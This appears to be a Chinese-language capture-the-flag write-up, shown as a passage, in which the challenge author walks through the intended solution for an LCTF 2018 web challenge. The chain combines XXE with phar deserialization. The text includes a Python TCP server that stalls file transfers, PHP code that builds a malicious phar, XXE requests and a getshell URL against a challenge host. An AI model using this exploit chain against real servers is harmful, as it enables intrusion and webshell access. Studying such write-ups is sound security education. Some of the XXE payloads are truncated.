我们已经清楚，生成的临时文件就是我们的 payload ，我们要通过这个 payload 完成反序列化和文件包含两个功能，但是他自己是
无法在上传之前知道自己的文件名的，没有确定的路径和文件名就没法包含，于是之前对 move 函数的分析就映入脑海，我们似乎能利用这个 move
函数将这个临时文件搬移到我们已知的路径，这其实也是我设计这个函数的目的
##### 问题三：
这个问题也是一个非常关键的点，也是这道题的难点中的难点，既然不能条件竞争，我们该怎么办，实际上我们可以通过自己写服务器端的方法完成这个功能，因为文件本身就在自己的服务器上，我想让他怎么传不是完全听我的？于是我写了一个简单的
TCP 服务器，这个服务器的特点就是在传输到文件的最后一个字节的时候突然暂停传输，我使用的是 sleep()
方法，这样就延长了时间，而且是任意时间的延长，但是实际上这厉害牵扯出一个问题，就是我们这样做文件实际上是不完整的，所以我们需要精心构造一个 payload
文件，这个文件的特点就是我在最后一个字节的后面又添加了一个垃圾字节，这样实际上在暂停过程中文件已经传输完毕了，只是服务器认为没有成功传输而已
代码如下：
    import sys 
    import time 
    import threading 
    import socketserver 
    from urllib.parse import quote 
    import http.client as httpc 
    listen_host = 'localhost' 
    listen_port = 9999 
    jar_file = sys.argv[1]
    class JarRequestHandler(socketserver.BaseRequestHandler):  
        def handle(self):
            http_req = b''
            print('New connection:',self.client_address)
            while b'\r\n\r\n' not in http_req:
                try:
                    http_req += self.request.recv(4096)
                    print('\r\nClient req:\r\n',http_req.decode())
                    jf = open(jar_file, 'rb')
                    contents = jf.read()
                    headers = ('''HTTP/1.0 200 OK\r\n'''
                    '''Content-Type: application/java-archive\r\n\r\n''')
                    self.request.sendall(headers.encode('ascii'))
                    self.request.sendall(contents[:-1])
                    time.sleep(300)
                    print(30)
                    self.request.sendall(contents[-1:])
                except Exception as e:
                    print ("get error at:"+str(e))
    if __name__ == '__main__':
        jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
        print ('waiting for connection...') 
        server_thread = threading.Thread(target=jarserver.serve_forever) 
        server_thread.daemon = True 
        server_thread.start() 
        server_thread.join()
到此为止，我对整道题的难点分析就结束了，下面就是大致的解题过程
## 0X04 解题过程
### 1.查看自己的 remote_addr 结合 K0rz3n 字符串生成md5
示例代码：
    file_path = "phar:///var/www/file/4253b1c836a25962c1547f7e46f373f1/jar.zip/test.txt";//这是文件包含的payload
            }
        }
        @unlink("phar.phar");
        $phar = new Phar("phar.phar");                   //后缀必须是 phar
        $phar->startBuffering();
        $phar->setStub("GIF89a".""); 
        $o = new K0rz3n_secret_flag();//我们将对象在这里创建
        $phar->setMetadata($o); //将对象在这里序列化
        $phar->addFromString("test.txt", ''); //我们文件包含的时候会触发 getshell
        $phar->stopBuffering();   
    ?>
运行这段代码以后我们就能获取到一个 phar.phar 文件，然后我们根据自己习惯改名后还要在文件末尾添加一个垃圾字节
如图所示：
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E5%9E%83%E5%9C%BE%E5%AD%97%E8%8A%82.png
"此处输入图片的描述")
### 3.判断临时文件目录
我们先随意打包一个压缩包(假设里面是一个xxe.php)上传到自己的服务器上，然后启动我们的自定义的服务器脚本，监听服务器的 9999 端口，然后本地利用
XXE 去请求这个文件，请求的时候我们要故意写一个不存在文件，比如 1.php
如图所示:
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%8E%B7%E5%BE%97%E8%AF%B7%E6%B1%82.png
"此处输入图片的描述")
我们服务器已经接收到了我们 XXE 发出的请求，然后后面的报错就和上面分析的一样，这里就不在赘述
### 4.通过列目录确定我们的payload文件名
我们将 server.py 这个服务器脚本的 sleep() 时间调的稍微长一些，比如调整为 600 s ，然后将我们的 payload 文件传上去，通过
XXE 请求这个文件，这时候临时文件生成，然后我们再通过 XXE 列目录得到临时文件名
请求 payload：
    !/test.txt" >]>
        &xxe;
        mypass
得到临时文件名
    ]>
        &xxe;
        mypass
如图所示：
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%8E%B7%E5%BE%97%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%90%8D.png
"此处输入图片的描述")
### 5.调用 Move 函数实现文件的拷贝
如图所示：
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E6%96%87%E4%BB%B6%E6%8B%B7%E8%B4%9D.png
"此处输入图片的描述")
示例代码：
    ?
    m=move
    &source=/usr/local/tomcat/temp/jar_cachexxxxxxxxxxxx.tmp
    &dest=jar.zip
这个时候我们的 payload 已经在我们可控的目录中了，并且被我们重名名为了 jar.zip ,这个我们在 payload 文件中写的是一致的
### 6.调用 check 函数实现反序列化 getshell
我们先在浏览器看一下：
如图所示：
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png
"此处输入图片的描述")
示例代码：
    [http://212.64.7.171/LCTF.php?m=check&c=compress.zlib://phar:///usr/local/tomcat/temp/jar_cachexxxxxxxxxxxxxxxxxx.tmp](http://212.64.7.171/LCTF.php?m=check&c=compress.zlib://phar:///usr/local/tomcat/temp/jar_cachexxxxxxxxxxxxxxxxxx.tmp)
没啥反应，其实我们放到菜刀里就有反映了
如图所示:
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20getshell.png "此处输入图片的描述")
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20getshell2.png "此处输入图片的描述")
这里还要注意一点，我们在创建 shell 的时候还要注意我们必须带上 cookie: 要不然会被 php 本身的逻辑给 die 掉
如图所示：
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20cookie.png "此处输入图片的描述")
### 7.找 flag
我说过 flag 没有在什么文件里，为了防止 XXE 该翻到，于是只能通过 grep 全局搜索，如果全局不行的话，就一个一个文件夹的全局，可能这个
shell 没法支持这么大的搜索量
如图所示：
[](https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20flag.png
"此处输入图片的描述")
## 0X05 总结
出这道题之前其实找了很久的思路，发现自己对知识的理解还是非常的肤浅，也学会了有时候看文档才是最好的学习方法，写这道题也用了很久，请教了非常多的大师傅，就在这里统一感谢一下，特别是
Java 的部分，因为写 Java 写的不多 ,想要实现一个自己脑袋里面的想法真的很难，甚至都把微信 XXE
的漏洞部分代码进行了巧妙的移植，不过我还是克服重重困难实现了功能，不管这道题出的好坏与否，脑洞与否，我都是出于技术交流与分享的目的，希望能将自己学到的东西以题目的形式展现给大家，没有任何的经济成分，这或许也是
CTF 一开始的目的吧，但是现在似乎已经不是这样了，总之做技术还是保持本心吧，还是那句话：”你的知识面，决定着你的攻击面”。